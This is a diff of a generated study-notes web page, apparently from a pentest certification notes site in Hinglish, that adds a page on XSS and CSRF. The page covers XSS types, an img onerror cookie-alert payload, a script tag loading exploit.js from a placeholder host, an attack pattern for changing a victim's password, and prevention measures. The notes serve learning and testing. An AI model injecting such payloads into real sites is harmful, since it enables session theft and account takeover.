@@ -8,7 +8,7 @@
       
       
       
-        <link rel="canonical" href="https://amu132.github.io/CPTS-Notes-Site/00-Fundamentals/Web-Applications/">
+        <link rel="canonical" href="https://amu132.github.io/CPTS-Notes-Site/00-Fundamentals/Web-Applications/XSS-CSRF-Overview/">
       
       
       
@@ -16,19 +16,19 @@
         
       
       
-      <link rel="icon" href="../../assets/images/favicon.png">
+      <link rel="icon" href="../../../assets/images/favicon.png">
       <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.7">
     
     
       
-        <title>Introduction to Web Applications - CPTS Notes - Amogh</title>
+        <title>Cross-Site Scripting (XSS) & CSRF - CPTS Notes - Amogh</title>
       
     
     
-      <link rel="stylesheet" href="../../assets/stylesheets/main.ec1eaa64.min.css">
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.ec1eaa64.min.css">
       
         
-        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.ab4e12ef.min.css">
       
       
 
@@ -47,7 +47,7 @@
       
     
     
-    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
     
       
 
@@ -70,7 +70,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#introduction-to-web-applications" class="md-skip">
+        <a href="#cross-site-scripting-xss-csrf" class="md-skip">
           Skip to content
         </a>
       
@@ -84,7 +84,7 @@
 
 <header class="md-header" data-md-component="header">
   <nav class="md-header__inner md-grid" aria-label="Header">
-    <a href="../.." title="CPTS Notes - Amogh" class="md-header__button md-logo" aria-label="CPTS Notes - Amogh" data-md-component="logo">
+    <a href="../../.." title="CPTS Notes - Amogh" class="md-header__button md-logo" aria-label="CPTS Notes - Amogh" data-md-component="logo">
       
   
   <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
@@ -104,7 +104,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Introduction to Web Applications
+              Cross-Site Scripting (XSS) &amp; CSRF
             
           </span>
         </div>
@@ -191,7 +191,7 @@
   
   
     <li class="md-tabs__item">
-      <a href="../.." class="md-tabs__link">
+      <a href="../../.." class="md-tabs__link">
         
   
   
@@ -210,7 +210,7 @@
   
   
     <li class="md-tabs__item">
-      <a href="../" class="md-tabs__link">
+      <a href="../../" class="md-tabs__link">
         
   
   
@@ -229,7 +229,7 @@
   
   
     <li class="md-tabs__item">
-      <a href="../../01-Recon/" class="md-tabs__link">
+      <a href="../../../01-Recon/" class="md-tabs__link">
         
   
   
@@ -248,7 +248,7 @@
   
   
     <li class="md-tabs__item">
-      <a href="../../02-Enumeration/" class="md-tabs__link">
+      <a href="../../../02-Enumeration/" class="md-tabs__link">
         
   
   
@@ -267,7 +267,7 @@
   
   
     <li class="md-tabs__item">
-      <a href="../../03-Web-Attacks/" class="md-tabs__link">
+      <a href="../../../03-Web-Attacks/" class="md-tabs__link">
         
   
   
@@ -286,7 +286,7 @@
   
   
     <li class="md-tabs__item">
-      <a href="../../Cheatsheets/" class="md-tabs__link">
+      <a href="../../../Cheatsheets/" class="md-tabs__link">
         
   
   
@@ -305,7 +305,7 @@
   
   
     <li class="md-tabs__item">
-      <a href="../../Methodology/" class="md-tabs__link">
+      <a href="../../../Methodology/" class="md-tabs__link">
         
   
   
@@ -340,7 +340,7 @@
 
 <nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
   <label class="md-nav__title" for="__drawer">
-    <a href="../.." title="CPTS Notes - Amogh" class="md-nav__button md-logo" aria-label="CPTS Notes - Amogh" data-md-component="logo">
+    <a href="../../.." title="CPTS Notes - Amogh" class="md-nav__button md-logo" aria-label="CPTS Notes - Amogh" data-md-component="logo">
       
   
   <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
@@ -370,7 +370,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../.." class="md-nav__link">
+      <a href="../../.." class="md-nav__link">
         
   
   
@@ -397,7 +397,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../" class="md-nav__link">
+      <a href="../../" class="md-nav__link">
         
   
   
@@ -424,7 +424,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../01-Recon/" class="md-nav__link">
+      <a href="../../../01-Recon/" class="md-nav__link">
         
   
   
@@ -451,7 +451,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../02-Enumeration/" class="md-nav__link">
+      <a href="../../../02-Enumeration/" class="md-nav__link">
         
   
   
@@ -478,7 +478,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../03-Web-Attacks/" class="md-nav__link">
+      <a href="../../../03-Web-Attacks/" class="md-nav__link">
         
   
   
@@ -505,7 +505,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../Cheatsheets/" class="md-nav__link">
+      <a href="../../../Cheatsheets/" class="md-nav__link">
         
   
   
@@ -532,7 +532,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../Methodology/" class="md-nav__link">
+      <a href="../../../Methodology/" class="md-nav__link">
         
   
   
@@ -579,10 +579,82 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#topics" class="md-nav__link">
+  <a href="#xss-overview" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Topics
+        XSS Overview
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-types-of-xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3 Types of XSS
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#example-payload-cookie-theft" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Example Payload (Cookie Theft)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#csrf-cross-site-request-forgery" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        CSRF (Cross-Site Request Forgery)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="CSRF (Cross-Site Request Forgery)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#common-attack-pattern" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Common Attack Pattern
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#prevention" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Prevention
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#pentest-relevance" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Pentest Relevance
       
     </span>
   </a>
@@ -609,19 +681,94 @@
   
 
 
-<h1 id="introduction-to-web-applications">Introduction to Web Applications<a class="headerlink" href="#introduction-to-web-applications" title="Permanent link">&para;</a></h1>
-<p>HTB Academy module — web application concepts, architecture, aur common vulnerabilities ka overview.</p>
-<h2 id="topics">Topics<a class="headerlink" href="#topics" title="Permanent link">&para;</a></h2>
+<h1 id="cross-site-scripting-xss-csrf">Cross-Site Scripting (XSS) &amp; CSRF<a class="headerlink" href="#cross-site-scripting-xss-csrf" title="Permanent link">&para;</a></h1>
+<h2 id="xss-overview">XSS Overview<a class="headerlink" href="#xss-overview" title="Permanent link">&para;</a></h2>
+<p>HTML Injection se related hai, lekin XSS mein <strong>JavaScript code inject</strong> karte hain (sirf HTML nahi). Agar victim ke browser mein code execute ho jaye, toh unka account/session compromise ho sakta hai.</p>
+<h2 id="3-types-of-xss">3 Types of XSS<a class="headerlink" href="#3-types-of-xss" title="Permanent link">&para;</a></h2>
+<table>
+<thead>
+<tr>
+<th>Type</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Reflected XSS</td>
+<td>User input turant page pe display hota hai (search results, error msgs)</td>
+</tr>
+<tr>
+<td>Stored XSS</td>
+<td>User input DB mein store hota hai, phir baad mein display hota hai (comments, posts)</td>
+</tr>
+<tr>
+<td>DOM XSS</td>
+<td>Input directly HTML DOM object mein likha jata hai (e.g. page title, username field)</td>
+</tr>
+</tbody>
+</table>
+<h2 id="example-payload-cookie-theft">Example Payload (Cookie Theft)<a class="headerlink" href="#example-payload-cookie-theft" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><span class="err">#&quot;</span><span class="o">&gt;&lt;</span><span class="nx">img</span><span class="w"> </span><span class="nx">src</span><span class="o">=</span><span class="err">/ onerror=alert(document.cookie)&gt;</span>
+</code></pre></div>
+<p>Ye payload:
+- Image tag inject karta hai jo intentionally break hoti hai (<code>src=/</code>)
+- <code>onerror</code> event trigger hota hai (image load fail hone pe)
+- <code>alert(document.cookie)</code> execute hoke victim ka cookie popup mein dikhata hai</p>
+<p><strong>Attacker use case:</strong> Cookie steal karke apne server pe bhejna → victim ke session se authenticate hona.</p>
+<h2 id="csrf-cross-site-request-forgery">CSRF (Cross-Site Request Forgery)<a class="headerlink" href="#csrf-cross-site-request-forgery" title="Permanent link">&para;</a></h2>
+<p>XSS jaisa hi input-sanitization flaw se aata hai, lekin CSRF <strong>victim ke authenticated session ka misuse</strong> karta hai — attacker unki taraf se actions perform karwata hai (bina unhe pata chale).</p>
+<h3 id="common-attack-pattern">Common Attack Pattern<a class="headerlink" href="#common-attack-pattern" title="Permanent link">&para;</a></h3>
+<ol>
+<li>Attacker malicious JS payload craft karta hai (e.g. password change request)</li>
+<li>Victim vulnerable page pe payload dekhta hai (e.g. malicious comment)</li>
+<li>JS automatically execute hota hai — victim ke logged-in session ka use karke password change ho jata hai</li>
+<li>Attacker ab victim ka account control kar sakta hai</li>
+</ol>
+<p><strong>Remote script loading example:</strong>
+<div class="highlight"><pre><span></span><code>&quot;&gt;<span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">//www.example.com/exploit.js</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</code></pre></div></p>
+<p><code>exploit.js</code> mein actual malicious logic hoti hai (password change API call automate karna).</p>
+<blockquote>
+<p><strong>Admin targeting:</strong> CSRF se agar admin ka session hijack ho jaye, toh sensitive backend functions tak access mil sakta hai.</p>
+</blockquote>
+<h2 id="prevention">Prevention<a class="headerlink" href="#prevention" title="Permanent link">&para;</a></h2>
+<table>
+<thead>
+<tr>
+<th>Control</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Sanitization</strong></td>
+<td>Special/non-standard characters remove karo input se pehle display/store karne ke</td>
+</tr>
+<tr>
+<td><strong>Validation</strong></td>
+<td>Input expected format match kare (e.g. email format check)</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Additional defenses:</strong>
+- Output bhi sanitize karo (defense-in-depth — agar input filter bypass ho jaye tab bhi safe rahe)
+- <strong>WAF</strong> (Web Application Firewall) — helps, lekin bypass ho sakta hai, primary defense nahi honi chahiye
+- Modern browsers ka built-in XSS protection
+- <strong>Anti-CSRF tokens</strong> — har session/request ke liye unique token
+- <strong>SameSite cookie attribute</strong> (<code>Strict</code> ya <code>Lax</code>) — cross-origin requests mein cookie include hone se rokta hai
+- Sensitive actions (password change) se pehle current password re-confirm karwana</p>
+<blockquote>
+<p><strong>Key takeaway:</strong> Ye sab defenses <strong>layers</strong> hain, primary safeguard nahi. Application ko secure-by-design banana zaroori hai, sirf security appliances pe depend nahi karna.</p>
+</blockquote>
+<h2 id="pentest-relevance">Pentest Relevance<a class="headerlink" href="#pentest-relevance" title="Permanent link">&para;</a></h2>
 <ul>
-<li><a href="Intro-to-Web-Applications/">Intro to Web Applications</a></li>
-<li><a href="Front-End-vs-Back-End/">Front-End vs Back-End</a></li>
-<li><a href="HTML/">HTML</a></li>
-<li><a href="JavaScript/">JavaScript</a></li>
-<li><a href="HTML-Injection/">HTML Injection</a></li>
-<li><a href="Sensitive-Data-Exposure/">Sensitive Data Exposure</a></li>
-<li><a href="XSS-CSRF-Overview/">XSS &amp; CSRF Overview</a></li>
-<li><a href="Backend-Web-Servers/">Back End Servers &amp; Web Servers</a></li>
+<li>Reflected XSS test karne ka fastest tareeka — search boxes, error messages mein payload try karo</li>
+<li>Stored XSS zyada dangerous hota hai — ek baar stored ho gaya toh har visitor affect hota hai</li>
+<li>CSRF token missing/predictable hona ek common finding hai bug bounty mein</li>
+<li><code>SameSite</code> cookie attribute missing check karna — quick low-hanging fruit</li>
 </ul>
+<hr />
+<p><em>Source: HTB Academy - Introduction to Web Applications</em></p>
 
 
 
@@ -671,10 +818,10 @@
     
       
       
-      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.tabs", "navigation.sections", "search.suggest", "content.code.copy"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+      <script id="__config" type="application/json">{"annotate": null, "base": "../../..", "features": ["navigation.tabs", "navigation.sections", "search.suggest", "content.code.copy"], "search": "../../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
     
     
-      <script src="../../assets/javascripts/bundle.d7400e89.min.js"></script>
+      <script src="../../../assets/javascripts/bundle.d7400e89.min.js"></script>
       
     
   </body>
